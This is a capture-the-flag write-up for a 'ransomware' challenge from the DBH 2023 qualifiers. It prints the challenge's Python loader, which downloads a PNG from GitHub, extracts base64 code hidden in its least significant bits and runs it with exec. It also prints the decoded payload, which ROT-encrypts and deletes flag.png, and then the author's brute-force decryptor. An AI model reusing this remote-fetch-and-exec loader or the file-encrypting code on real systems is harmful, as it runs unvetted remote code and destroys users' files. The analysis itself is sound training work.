#DBH #deutschlandsbesterhacker #challanges #cybersecurity 

---
> hun7er Cybersecurity | Sep 18th, 2023
---

## Instructions
<br />

```
Die Developer Akademie wurde am 17.06.2023 während eines Kundeneventsvon der mittlerweile
weltbekannten Ransomware Csar befallen, die nach dem römischen Kaiser Julius Cäsar benannt wurde.
Zum Glück wurde die in Python entwickelte Ransomware ransomware.py nicht verschlüsselt,
sodass sich die Techniker der Developer Akademie an der Programmierung eines geeigneten Decryptors versuchen können.
Kannst du ihnen bei der Entwicklung des Decryptors helfen?

Datei: ransomware.py
SHA256 checksum: 8b3b5dcb2f4e4ab83600f8d27ad907e3cdc53246c589dfa197c587f80e73fc9f

Datei: flag.png.encrypted
SHA256 checksum: 5dbab4261f97694fb6d3a018a7ef4383712b614484965cfd58f247fe33b5433e
```


* Download this `ransomware.py`, `flag.png.encrypted` files
---
<br />

## Starting investigating


Open `ransomware.py` in your preferred editor:
```python
import cv2, base64, requests
import numpy as np

def s2t(s):
    t = ""
    for i in range(0, len(s), 8):
        bits = s[i:i+8]
        char = chr(int(bits, 2))
        t += char
    return t

def dwnld(url):
    response = requests.get(url)
    if response.status_code == 200:
        image_bytes = response.content
        image_array = np.asarray(bytearray(image_bytes), dtype=np.uint8)
        img = cv2.imdecode(image_array, cv2.IMREAD_COLOR)
        return img

def extract(img):
    s = ""
    for x in range(img.shape[0]):
        for y in range(img.shape[1]):
            b, g, r = img[x, y]
            s += bin(b)[-1]
            s += bin(g)[-1]
            s += bin(r)[-1]
    result = s2t(s)
    return result[:result.index('#')]

if __name__ == "__main__":
    exec(base64.b64decode(
        extract(
            dwnld("https://raw.githubusercontent.com/florian-dalwigk/duck/main/mandarin.png"))))
```
---
<br />

## Analyzing behavior

* at the first view of the function `main` we see the previous code goes to a github Repository and tries to download a picture `mandarin.png` 

* If we run `ransomware.py` and there is no `flag.png` in the `current working directory`, we expect an error.
<br />

Create an `flag.png` file with the following command:
```bash
touch flag.png 
```

* Run `ransomware.py` again

* Now the code runs perfectly without errors, but what happened?


Look in your `current working directory` with the following command:
```bash
ls -la
```

* You will now see that nothing happened, are you sure?

* The `flag.png.encrypted` was overwritten by the program, which means that the `ransomware.py` encrypts data (damn)
  
* How can we decrypt our data let's investigate it
---
<br />

## Investigation of the code


* first question: What kind of encryption technique does `ransomware.py` use?

Let's look at the following function:
```python
def extract(img):
    s = ""
    for x in range(img.shape[0]):
        for y in range(img.shape[1]):
            b, g, r = img[x, y]
            s += bin(b)[-1]
            s += bin(g)[-1]
            s += bin(r)[-1]
    result = s2t(s)
    return result[:result.index('#')]
```

* At first view we see `b, g, r = img[x, y]` but the interesting part are the letters of these 3 variables `b`, `g` and `r` (hmm)

* let's reverse it and remove the commas and now we had `rgb` 

* Well, now we have one piece of the puzzle

* What kind of technique does the function use? With our information the given function use a LSB(Last Significant Bit) technique but is this necessary for us

* let's print out the `result` variable
<br />
  
Add a print function and run the `ransomware.py` file:
```python
def extract(img):
    s = ""
    for x in range(img.shape[0]):
        for y in range(img.shape[1]):
            b, g, r = img[x, y]
            s += bin(b)[-1]
            s += bin(g)[-1]
            s += bin(r)[-1]
    result = s2t(s)
    print(result)
    return result[:result.index('#')]
```

Output:
```txt
aW1wb3J0IG9zLCByYW5kb20sIGJhc2U2NA0KDQpkZWYgcm90X2VuY3J5cHQobSwgayk6DQogICAgYSA9ICJBQkNERUZ
HSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ4eXowMTIzNDU2Nzg5Ky8iDQogICAgYyA9IC
IiDQogICAgZm9yIGNoYXIgaW4gbToNCiAgICAgICAgaWYgY2hhciBpbiBhOg0KICAgICAgICAgICAgcG9zID0gYS5pb
mRleChjaGFyKQ0KICAgICAgICAgICAgY19wb3MgPSAocG9zICsgaykgJSBsZW4oYSkNCiAgICAgICAgICAgIGMgKz0g
YVtjX3Bvc10NCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGMgKz0gY2hhcg0KICAgIHJldHVybiBjDQoNCmRlZiB
lbmNyeXB0KHAsIGspOg0KICAgIHdpdGggb3BlbihwLCAicmIiKSBhcyBmOg0KICAgICAgICBiID0gZi5yZWFkKCkNCi
AgICAgICAgYjY0ID0gYmFzZTY0LmI2NGVuY29kZShiKS5kZWNvZGUoInV0Zi04IikNCiAgICAgICAgYyA9IHJvdF9lb
mNyeXB0KGI2NCwgaykNCiAgICAgICAgd2l0aCBvcGVuKGYie3B9LmVuY3J5cHRlZCIsICJ3YiIpIGFzIGY6DQogICAg
ICAgICAgICBmLndyaXRlKGJhc2U2NC5iNjRkZWNvZGUoYykpDQogICAgb3MucmVtb3ZlKHApDQoNCmlmIF9fbmFtZV9
fID09ICJfX21haW5fXyI6DQogICAgayA9IHJhbmRvbS5yYW5kaW50KDEsIDYzKQ0KICAgIGVuY3J5cHQoImZsYWcucG
5nIiwgayk=#aW1wb3J0IG9zLCByYW5kb20sIGJhc2U2NA0KDQpkZWYgcm90X2VuY3J5cHQobSwgayk6DQogICAgYSA9
ICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ4eXowMTIzNDU2Nzg5Ky8iDQo
gICAgYyA9ICIiDQogICAgZm9yIGNoYXIgaW4gbToNCiAgICAgICAgaWYgY2hhciBpbiBhOg0KICAgICAgICAgICAgcG
9zID0gYS5pbmRleChjaGFyKQ0KICAgICAgICAgICAgY19wb3MgPSAocG9zICsgaykgJSBsZ
```

* hooooly what is this, let's look at Cyberchef if there are something interesting in it encoded

---
<br />

## Cyberchef


Open Cyberchef in your preferred browser:
```https
https://cyberchef.org/
```

Setting up Cyberchef:
<img src='https://github.com/hun7erCybersecurity/CTF-Writeups/blob/main/DBH-qualifiers-2023/stego/ransomware/img/Pasted image 20230919002241.png' alt='Setting up Cyberchef'>
+ Type `base64` in the search field and move `from Base64` per drag and drop to the Recipe field on the right side 
 
Put the junk output in the Cyberchef input field like the following:
<img src='https://github.com/hun7erCybersecurity/CTF-Writeups/blob/main/DBH-qualifiers-2023/stego/ransomware/img/Pasted image 20230919002553.png' alt='Put the junk output in the Cyberchef input field'>


* After you have it done right, you saw another python code.
---
<br />

## Investigate this code


```python
import os, random, base64

def rot_encrypt(m, k):
    a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvxyz0123456789+/"
    c = ""
    for char in m:
        if char in a:
            pos = a.index(char)
            c_pos = (pos + k) % len(a)
            c += a[c_pos]
        else:
            c += char
    return c

def encrypt(p, k):
    with open(p, "rb") as f:
        b = f.read()
        b64 = base64.b64encode(b).decode("utf-8")
        c = rot_encrypt(b64, k)
        with open(f"{p}.encrypted", "wb") as f:
            f.write(base64.b64decode(c))
    os.remove(p)

if __name__ == "__main__":
    k = random.randint(1, 63)
    encrypt("flag.png", k)
```

* It is a rotation(ROT) encryption like Caesar used in his time. 
---
<br />

## Solve the Challenge

* let's create a decryption script

* If we look closer we see that `encrypt.py` uses the function `randint()` with the value `63`, which means that we need this iteration also in our script
<br />


The following code `solve.py` decrypts the `flag.png.encrypted` file 64 times:
```python
import os
import base64


print('\033[33m' + ''' __                       __________
|  |                     |______   /
|  |                           /  /
|  |                          /  /
|  |_____ __    __ __  __    /  /_____ _ _____
|   __   |  |  |  |  \|  |  /  /  _   \ ' ___/
|  |  |  |  |  |  |   \  | /  /  (_/  /  |
|  |  |  |  |  |  |      |/  /   ____/|  |
|  |  |  |  |__|  |  \   |  /|  |____ |  |
|__|  |__|________|__|\__|_/ |_______||__|''' + '\033[0m')
print('\033[35m' + '****************************************************' + '\033[0m')
print('\033[35m' + '*                                                  *' + '\033[0m')
print('\033[35m' + '*            Copyright of hun7er, 2023             *' + '\033[0m')
print('\033[35m' + '*                                                  *' + '\033[0m')
print('\033[35m' + '*    https://www.github.com/hun7erCybersecurity    *' + '\033[0m')
print('\033[35m' + '*                                                  *' + '\033[0m')
print('\033[35m' + '****************************************************' + '\033[0m')
print('\n\033[94m[+] \033[0m\033[33m' + 'Process status: running...'+ '\033[0m')

def rot_decrypt(c, k):
    a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvxyz0123456789+/"
    m = ""
    for char in c:
        if char in a:
            pos = a.index(char)
            m_pos = (pos - k) % len(a)
            m += a[m_pos]
        else:
            m += char
    return m

def decrypt(p):
    with open(p, "rb") as f:
        b64 = base64.b64encode(f.read()).decode("utf-8")
        for k in range(64):
            m = rot_decrypt(b64, k)
            with open(f"{k}_{os.path.splitext(p)[0]}", "wb") as f:
                f.write(base64.b64decode(m))

if __name__ == "__main__":
    decrypt("flag.png.encrypted")
    print('\033[32m[*] \033[0m\033[33m' + 'Process status: done \033[32m✔\033[0m')
```

* If the program has run correctly you will see a `done ✔` at the end.

* After that, many files were decrypted, but only one of them is a real image.

---
<br />

Theeeeeere weeeeee gooooooo we solved the Challenge:
<img src='https://github.com/hun7erCybersecurity/CTF-Writeups/blob/main/DBH-qualifiers-2023/stego/ransomware/img/Pasted image 20230919004211.png' alt='Flag Image'>

<br />

Copy the flag and past it in a file with the following command:
```bash
echo "DBH{R4ns0mwar3_DEcrypt3d!}" > flag.txt
```
---
<br />

## Watch the flag

<br />

Shows the input of the flag.txt:
```bash
cat flag.txt
```
Output:
```txt
DBH{R4ns0mwar3_DEcrypt3d!}
```
---
